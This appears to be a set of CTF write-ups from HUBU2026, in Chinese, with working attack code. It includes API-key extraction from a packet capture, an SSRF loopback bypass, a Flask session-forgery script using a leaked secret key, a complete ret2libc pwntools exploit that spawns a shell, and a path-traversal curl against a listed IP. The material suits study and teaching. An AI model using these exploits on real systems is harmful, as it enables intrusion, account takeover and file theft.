分析 pcapng 抓包文件，搜索 HTTP/HTTPS 请求中的敏感信息。API Key 满足 `sk-` 开头的格式，可以直接用正则从流量中提取，再按题目要求拼接为 `HUBU{apikey}`。

#### Exp

```python
import re

with open(r'd:\BaiduNetdiskDownload\你会猛猛蹬吗\bkbqwq.pcapng', 'rb') as f:
    data = f.read()

apikey = re.findall(rb'sk-[A-Za-z0-9]+', data)[0].decode()
print(f'HUBU{{{apikey}}}')
```

### HUBU2026-tiny-proxy

#### 保护与关键点

访问 `/preview` 页面后，发现目标是一个 Tiny Proxy 服务，可以代理请求任意 URL。直接尝试访问 `http://127.0.0.1/` 会被拦截。

#### 漏洞点与利用思路

私有 IP 限制只拦截了常见的本地地址表示，可以使用 `http://0.0.0.0/` 绕过。通过代理继续扫描本机端口，发现 `5000` 端口上运行着同一个 Tiny Proxy 服务，最终访问内部接口读取 flag。

```text
http://0.0.0.0:5000/internal/flag
```

---





# awdp-easytime

## 题目信息

主要文件：

```text
2/awdp-easytime/index.py
2/awdp-easytime/docker-compose.yaml
2/awdp-easytime/html/date.php
2/awdp-easytime/html/index.php
2/awdp-easytime/html/phpinfo.php
```

这是一个 Flask 后台服务，`docker-compose.yaml` 中还同时启动了 Apache + PHP。

Flask 监听 `5000` 端口，后台功能包括：

- `/login`：登录
- `/dashboard`：后台首页
- `/plugin/upload`：插件 zip 上传
- `/board`：留言板
- `/about`：个人信息和头像设置

## 漏洞分析

### 1. Flask SECRET_KEY 泄露

在 `docker-compose.yaml` 中可以看到：

```yaml
environment:
  - SECRET_KEY=92497f7c6e39c595db07178c6b42d90414046160c69bfe30ec49c9571b9e7afe
  - ADMIN_USERNAME=admin
```

Flask 默认 session 是客户端签名 cookie。只要知道 `SECRET_KEY`，就可以伪造任意 session。

`index.py` 中登录态判断如下：

```python
def is_logged_in() -> bool:
    session_user = flask.session.get("user")
    return isinstance(session_user, str) and bool(session_user)
```

也就是说，只要伪造：

```json
{"user": "admin"}
```

就可以绕过登录。

## 利用脚本

```python
import requests
from flask import Flask

target = "http://127.0.0.1:5000"

secret_key = "92497f7c6e39c595db07178c6b42d90414046160c69bfe30ec49c9571b9e7afe"

app = Flask(__name__)
app.secret_key = secret_key

serializer = app.session_interface.get_signing_serializer(app)
cookie = serializer.dumps({"user": "admin"})

print("[+] forged session =", cookie)

r = requests.get(
    target + "/dashboard",
    cookies={"session": cookie},
    allow_redirects=False,
)

print("[+] status =", r.status_code)
print(r.text[:500])
```

运行后如果返回 `200`，说明已经成功进入后台。

也可以继续访问：

```python
for path in ["/dashboard", "/plugin/upload", "/board", "/about"]:
    r = requests.get(target + path, cookies={"session": cookie}, allow_redirects=False)
    print(path, r.status_code)
```

## 其他功能点

### 插件上传

`/plugin/upload` 会上传并解压 zip：

```python
def safe_extract_zip(zip_path: Path, dest_dir: Path) -> list[str]:
    dest_dir = dest_dir.resolve()
    extracted = []

    with zipfile.ZipFile(zip_path, "r") as zf:
        for info in zf.infolist():
            name = info.filename.replace("\\", "/")

            if name.endswith("/"):
                continue

            parts = Path(name).parts
            if (
                name.startswith("/")
                or (len(name) >= 2 and name[1] == ":")
                or ".." in parts
                or "." in parts
                or not parts
            ):
                raise ValueError("Illegal path in zip")
```

这里对绝对路径、`..`、`.` 都做了限制，因此当前附件版本中不能直接 ZipSlip 写到 Web 目录。

### 远程头像 SSRF 检查

`/about` 中允许设置远程头像 URL，但是有过滤：

```python
if parsed.scheme not in ALLOWED_REMOTE_AVATAR_SCHEMES:
    raise ValueError("头像远程 URL 仅支持 http/https")
if parsed.username or parsed.password:
    raise ValueError("头像远程 URL 不允许包含认证信息")
if not parsed.hostname or not _host_is_public(parsed.hostname):
    raise ValueError("头像远程 URL 必须指向公网地址")
if parsed.port not in (None, 80, 443):
    raise ValueError("头像远程 URL 仅允许默认端口")
```

其中 `_host_is_public` 会过滤私有地址、回环地址、链路本地地址等：

```python
if (
    ip_obj.is_private
    or ip_obj.is_loopback
    or ip_obj.is_link_local
    or ip_obj.is_multicast
    or ip_obj.is_reserved
):
    return False
```

所以当前附件版本中也不能直接通过 `127.0.0.1` 访问容器内 Apache。

```text

```

---

# awdp-pwn2

## 保护检查

```bash
checksec --file=pwn2
```

结果：

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

程序特征：

- 64 位程序
- 没有 Canary
- NX 开启
- 没有 PIE，程序地址固定
- Partial RELRO，GOT 可读

适合使用 ret2libc。

## 反汇编分析

核心函数 `vuln`：

```asm
00000000004011e8 <vuln>:
  4011ec: 55                    push   rbp
  4011ed: 48 89 e5              mov    rbp,rsp
  4011f0: 48 83 ec 40           sub    rsp,0x40
  ...
  401230: 48 8d 45 c0           lea    rax,[rbp-0x40]
  401234: ba 00 02 00 00        mov    edx,0x200
  401239: 48 89 c6              mov    rsi,rax
  40123c: bf 00 00 00 00        mov    edi,0x0
  401241: e8 2a fe ff ff        call   read@plt
  ...
  401256: c9                    leave
  401257: c3                    ret
```

栈上只开了 `0x40` 字节，但是 `read` 读入 `0x200` 字节，存在明显栈溢出。

返回地址偏移：

```text
0x40 + 8 = 0x48 = 72
```

## 可用 gadget

```text
pop rdi; ret = 0x4011e3
ret          = 0x40101a
```

程序中有 `puts@plt`、`puts@got`，可以先泄露 libc 地址：

```text
pop rdi; ret
puts@got
puts@plt
vuln
```

泄露完成后回到 `vuln`，进行第二次溢出，调用：

```c
system("/bin/sh")
```

## 利用思路

第一阶段：

1. 覆盖返回地址
2. 调用 `puts(puts@got)`
3. 泄露 `puts` 的真实 libc 地址
4. 返回 `vuln`

第二阶段：

1. 根据泄露地址计算 libc base
2. 找到 `system`
3. 找到 `/bin/sh`
4. 调用 `system("/bin/sh")`

## exp

```python
from pwn import *

context.binary = "./pwn2"
context.log_level = "info"

elf = context.binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi = 0x4011e3
ret = 0x40101a
offset = 72


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(elf.path)


io = start()

# stage 1: leak puts
io.recvuntil(b"Input:\n")

payload = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.sym["vuln"],
)

io.send(payload)

io.recvuntil(b"Bye~\n")
puts_leak = u64(io.recvline().strip().ljust(8, b"\x00"))

libc.address = puts_leak - libc.sym["puts"]

log.success(f"puts leak = {hex(puts_leak)}")
log.success(f"libc base = {hex(libc.address)}")

# stage 2: system('/bin/sh')
io.recvuntil(b"Input:\n")

payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    next(libc.search(b"/bin/sh\x00")),
    libc.sym["system"],
)

io.send(payload)

io.interactive()
```

## 本地验证

本地测试可以成功执行命令：

```text
PWNED
uid=1001(ctf) gid=1001(ctf)
```

远程利用：

```bash
python3 exp.py REMOTE HOST=<ip> PORT=<port>
```

拿到 shell 后读取 flag：

```bash
cat flag* /flag*
```

---

# HUBU2026-awdp-MediaDrive-web

利用点是 download.php / preview.php 的任意文件读取：

f 参数拼到 uploads 路径后只做了 realpath()，没有校验结果仍在 uploads 内。 验证命令： 

```
curl "http://116.211.228.232:43845/download.php?f=../../../../flag"
```

